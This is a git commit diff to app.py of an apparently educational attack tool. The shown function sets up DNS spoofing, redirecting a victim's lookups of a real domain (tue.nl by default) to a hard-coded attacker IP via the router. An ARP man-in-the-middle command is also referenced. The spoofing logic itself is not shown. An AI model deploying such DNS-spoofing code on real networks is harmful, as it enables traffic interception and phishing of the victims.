1fa4cd94a851b92450daf936a925bed8f38e374e
WGAVermeer <90707235+WGAVermeer@users.noreply.github.com>
2023-06-12 17:25:33 +0200

    testing

--- app.py
+++ app.py
@@ -15,15 +15,14 @@ def Arp_MiM(ipVictim: str, ipServer: str):
 @app.command()
 def DNS_Spoof(ipVictim: str = "0.0.0.0", OGSite: str = 'tue.nl', EvilIp: str = "146.190.62.39", queue_num: int = 1, ipRouter = "Default Router"):
     
-    
-
     if ipRouter == "Default Router":
         ipRouter = conf.route.route("0.0.0.0")[2]
 
-    print (f'ipVictim = {ipVictim}, ipRouter = {ipRouter}, evilIP = {EvilIp}, OGSite = {OGSite}, queue_num = {queue_num}')
+    #print (f'ipVictim = {ipVictim}, ipRouter = {ipRouter}, evilIP = {EvilIp}, OGSite = {OGSite}, queue_num = {queue_num}')
 
     host = (OGSite, EvilIp)
-    Dns_spoof(queue_num=queue_num, ipVictim=ipVictim, ipServer=ipRouter, host=host)
+    spoof = Dns_spoof(queue_num=queue_num, ipVictim=ipVictim, ipServer=ipRouter, host=host)
+    spoof()
 
 if __name__ == "__main__":
     app()
